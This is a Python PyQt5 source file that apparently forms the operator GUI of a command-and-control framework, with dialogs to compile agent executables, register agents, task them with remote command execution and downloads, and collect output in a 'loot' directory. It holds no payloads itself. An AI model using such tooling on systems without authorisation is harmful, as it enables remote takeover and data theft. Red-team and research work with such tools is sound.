#!/usr/bin/env python
#-*- coding:utf-8 -*-

import sys
import traceback
import paletteColors
import design
from paramiko import ssh_exception
from PyQt5 import QtCore, QtGui, QtWidgets

class ConnectDialogue(QtWidgets.QDialog, design.Ui_ManagerServerConnect):
    def __init__(self, session, parent=None):
        QtWidgets.QDialog.__init__(self, parent)
        self.setupUi(self)
        self.color = paletteColors.Colors()
        self.session = session
        self.setPalette(self.color.pltActive)

        self.Connect.clicked.connect(self.getConnect)
        self.setWindowTitle("Management Console")

    def getConnect(self):
        value = self.IP.text()
        print("[i] Attempting to connect to ip: %s"% value)
        self.session.update_addr(value)
        if self.Port.text() != '':
            self.session.update_port(int(self.Port.text()))
        try:
            self.session.init_connection()
 
        #except ValueError:
         #   QtWidgets.QMessageBox.information(self, "Illegal Input", "The value you passed was not a valid IP address")
          #  return
        except ssh_exception.NoValidConnectionsError:
            QtWidgets.QMessageBox.information(self, "Connection Refused", "The server refused the SSH connection")
            self.session.unlock()
            return
        except ssh_exception.SSHException:
            QtWidgets.QMessageBox.information(self, "Connection Failed", "Something happened. Check the console for more infromation")
            print(traceback.format_exc())
            self.session.unlock()
            return


        print("[+] Successfully connected!")
        self.close()    

class AgentCompileDialogue(QtWidgets.QDialog, design.Ui_AgentCompile):
    def __init__(self, session, parent=None):
        QtWidgets.QDialog.__init__(self, parent)
        self.setupUi(self)
        self.color = paletteColors.Colors()
        self.session = session
        self.setPalette(self.color.pltActive)

        self.buttonBox.button(QtWidgets.QDialogButtonBox.Ok).clicked.connect(self.success)
        #self.buttonBox.button(QtGui.QDialogButtonBox.Cancel).clicked.connect(self.cancel)
        

    def success(self):
        if self.ServerPort.text() == '':
            self.session.compile_agent(self.ServerIP.text(), 22)
        else:
            self.session.compile_agent(self.ServerIP.text(), int(self.ServerPort.text()))

        reply = QtWidgets.QMessageBox.information(self, "Success!", "Successfully retrieved agent executable")
            

class AgentDownloadDialogue(QtWidgets.QDialog, design.Ui_AgentDownload):
    def __init__(self, session, agent_id, parent=None):
        QtWidgets.QDialog.__init__(self, parent)
        self.setupUi(self)
        self.color = paletteColors.Colors()
        self.session = session
        self.agent_id = agent_id
        self.setPalette(self.color.pltActive)

        self.buttonBox.button(QtWidgets.QDialogButtonBox.Ok).clicked.connect(self.do_download)
        
    def do_download(self):
        self.session.do_download(self.agent_id, self.Path.text())
        reply = QtWidgets.QMessageBox.information(self, "Success!", "Successfully tasked agent with download operation")
            

class AgentRegisterDialogue(QtWidgets.QDialog, design.Ui_AgentRegister):
    def __init__(self, session, parent=None):
        QtWidgets.QDialog.__init__(self, parent)
        self.setupUi(self)
        self.color = paletteColors.Colors()
        self.session = session
        self.setPalette(self.color.pltActive)

        self.buttonBox.button(QtWidgets.QDialogButtonBox.Ok).clicked.connect(self.do_register)

    def do_register(self):
        if self.Username.text() == '' or self.Password.text() == '':
            print("[-] Could not register agent credentials: Missing parameters")
        else:
            self.session.register_agent(self.Username.text(), self.Password.text())
            reply = QtWidgets.QMessageBox.information(self, "Success!", "Successfully registered agent with the server")
            

class AgentCommandDialogue(QtWidgets.QDialog, design.Ui_CommandDialogue):
    def __init__(self, session, agent_id, parent=None):
        QtWidgets.QDialog.__init__(self, parent)
        self.setupUi(self)
        self.color = paletteColors.Colors()
        self.session = session
        self.agent_id = agent_id
        self.setPalette(self.color.pltActive)

        self.buttonBox.button(QtWidgets.QDialogButtonBox.Ok).clicked.connect(self.send_comm)

    def send_comm(self):
        if self.Input.text() =="":
            print("Found blank line")
        else:
            self.session.send_command(self.agent_id, self.Input.text())
            reply = QtWidgets.QMessageBox.information(self, "Success!", "Successfully tasked agent with command execution. Check the loot directory occasionally for output")
            

class ServerBackendDialogue(QtWidgets.QDialog, design.Ui_server_backend_dialog):
    def __init__(self, session, parent=None):
        QtWidgets.QDialog.__init__(self, parent)
        self.setupUi(self)
        self.color = paletteColors.Colors()
        self.session = session
        self.setPalette(self.color.pltActive)
        self.transports = self.session.get_transports()
        
        for entry in self.transports:
            print("Adding item")
            item = QtWidgets.QListWidgetItem()
            item.setText(entry.id_str)
            item.setData(QtCore.Qt.UserRole, entry)
            self.avail_backends_list.addItem(item)

        self.buttonBox.button(QtWidgets.QDialogButtonBox.Ok).clicked.connect(self.start_backend)

    def start_backend(self):
        if not self.avail_backends_list.currentItem():
            reply = QtWidgets.QMessageBox.information(self, "No Backend Selected", "Select a backend from the list before continuing")
            
        elif self.port_edit.text() == "":
            reply = QtWidgets.QMessageBox.information(self, "No Port Specified", "Please identify a port to use before continuing")
        else:
            backend_id = self.avail_backends_list.currentItem().data(QtCore.Qt.UserRole).id_num
            port = int(self.port_edit.text())
            self.session.start_transport(backend_id, port)